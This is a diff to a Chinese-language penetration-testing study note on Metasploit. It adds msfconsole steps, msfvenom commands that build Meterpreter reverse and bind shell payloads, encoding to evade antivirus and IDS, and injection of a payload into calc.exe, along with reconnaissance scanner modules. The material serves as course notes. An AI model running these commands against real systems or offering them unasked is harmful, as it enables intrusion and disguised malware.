@@ -15,15 +15,16 @@
 ![[07_Penetration Testing Practice_弱點利用平台_v1.0.pdf#page=23&rect=154,33,809,461|07_Penetration Testing Practice_弱點利用平台_v1.0, p.23]]
 ## 🧪 常見操作指令
 
-```
-# 啟動
-Metasploit msfconsole
+### msfconsole
 
+```
 # 搜尋模組
-search exploit samba
+search <vulnerbility>
+// search exploit samba
 
 # 載入模組
-use exploit/linux/samba/...
+use <module>
+// use exploit/linux/samba/...
 
 # 參考模組設定
 show options
@@ -37,3 +38,44 @@ set <options> <value>
 # 執行攻擊
 exploit
 ```
+
+### searchsploit
+https://www.exploit-db.com/searchsploit
+
+### Msfvenom (msfpayload & msfencode)
+- msfpayload 工具：
+- 用於產生shellcode，可生成C、Ruby、JaveScript、VB 格式的shellcode 
+- msfencode 工具：
+	- 用於編碼或壓縮shellcode，以避過IDS、防火牆或防毒軟體 
+	- 常用效果較佳的編碼方式(encoders)是x86/shikata_ga_nai
+
+```
+# Example 1: 列出payloads:
+msfvenom -l payloads
+
+# Example 2: 產出 windows/meterpreter/reverse_tcp:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe
+
+# Example 3: 產出 payload 加上避免偵測的編碼(avoids certain bad characters):
+msfvenom -p windows/meterpreter/bind_tcp -b '\x00' 
+
+# Example 4: 產出 payload在使用特定 encode 3 次: 
+msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
+
+# Example 5: 注入payload到calc.exe 並另存成的new.exe： 
+msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe
+```
+
+### Intelligence Gathering（資安偵查模組）
+
+|功能|模組範例|
+|---|---|
+|Port Scan|auxiliary/scanner/portscan/tcp|
+|服務掃描|ftp_version、smb_version、ssh_version|
+|匿名登入掃描|ftp_anonymous、snmp_login|
+|Web 偵查|http_title、wordpress_pingback_access|
+
+## Example: Autopwn
+
+![[07_Penetration Testing Practice_弱點利用平台_v1.0.pdf#page=37&rect=102,67,841,464|07_Penetration Testing Practice_弱點利用平台_v1.0, p.37]]
+
